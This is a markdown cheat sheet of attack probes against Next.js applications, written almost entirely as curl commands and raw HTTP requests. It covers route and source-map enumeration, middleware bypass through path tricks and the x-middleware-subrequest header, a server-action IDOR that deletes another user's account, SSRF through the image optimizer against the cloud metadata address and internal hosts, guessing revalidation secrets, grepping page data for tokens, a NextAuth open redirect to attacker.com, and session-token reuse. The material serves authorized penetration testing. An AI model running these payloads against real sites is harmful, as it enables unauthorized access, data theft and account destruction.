# Next.js — Annotated Test Examples

## Route Enumeration

### Build manifest extraction
```bash
# buildId is in the page HTML as __NEXT_DATA__.buildId
curl -s "https://target.com/_next/static/BUILD_ID/_buildManifest.js"
```
Returns all routes: `{"sortedPages":["/","/admin","/settings","/api/users"]}`

### Client-side route dump (browser)
```javascript
// Paste in browser console
console.log(JSON.stringify(window.__BUILD_MANIFEST?.sortedPages, null, 2))
```

### Source map exposure
```
GET /_next/static/chunks/main-app.js.map
```
Reveals file paths, function names, server action IDs.

---

## Middleware Bypass

### Path normalization variants
```
GET /api/admin/users          → 401 (expected)
GET /api//admin/users         → 200 (double slash bypasses middleware regex)
GET /api/./admin/users        → 200 (dot segment bypass)
GET /API/admin/users          → 200 (case normalization bypass)
```

### x-middleware-subrequest header (known bypass for affected Next.js versions)
```
GET /api/admin/users HTTP/1.1
x-middleware-subrequest: pages/_middleware
```

---

## Server Actions

### Direct invocation outside UI
```
POST /dashboard HTTP/1.1
Next-Action: ACTION_ID
Content-Type: application/json

["USER_B_ID", {"action": "deleteAccount"}]
```
If no server-side ownership check → Server Action IDOR.

### Content-type switching
```
POST /dashboard HTTP/1.1
Next-Action: ACTION_ID
Content-Type: multipart/form-data; boundary=--x

----x
Content-Disposition: form-data; name="userId"
USER_B_ID
----x--
```

---

## RSC Payload Over-Fetching

### Request RSC flight data directly
```
GET /dashboard HTTP/1.1
Rsc: 1
Accept: text/x-component
Authorization: Bearer USER_TOKEN
```
Inspect response stream for serialized `email`, `role`, `token`, `internal*` fields not shown in DOM.

---

## __NEXT_DATA__ Inspection

```bash
# Extract and pretty-print server-side props
curl -s "https://target.com/profile" | \
  grep -oP '(?<=<script id="__NEXT_DATA__" type="application/json">).*?(?=</script>)' | \
  python3 -m json.tool | grep -iE 'password|token|secret|admin|internal'
```

---

## Image Optimizer SSRF

```
GET /_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=64&q=75
GET /_next/image?url=http%3A%2F%2Flocalhost%3A5432%2F&w=64&q=75
GET /_next/image?url=http%3A%2F%2Finternal-api%2Fhealth&w=64&q=75
```
200 with image data or non-404 response = internal host reached.

---

## ISR Revalidation

```bash
# Probe for weak or leaked revalidation secret
curl -s "https://target.com/api/revalidate?secret=secret123&path=/admin"
curl -s "https://target.com/api/revalidate?secret=preview&tag=homepage"
```

---

## NextAuth

### callbackUrl open redirect
```
GET /api/auth/signin?callbackUrl=https%3A%2F%2Fattacker.com
```
If response sets cookie and redirects to attacker.com — open redirect confirmed.

### Session token cross-route reuse
```bash
# Obtain session token from auth endpoint
SESSION=$(curl -s "https://target.com/api/auth/session" -H "Cookie: $COOKIE" | jq -r '.accessToken')
# Use on unrelated internal route
curl -s "https://target.com/api/internal/admin" -H "Authorization: Bearer $SESSION"
```
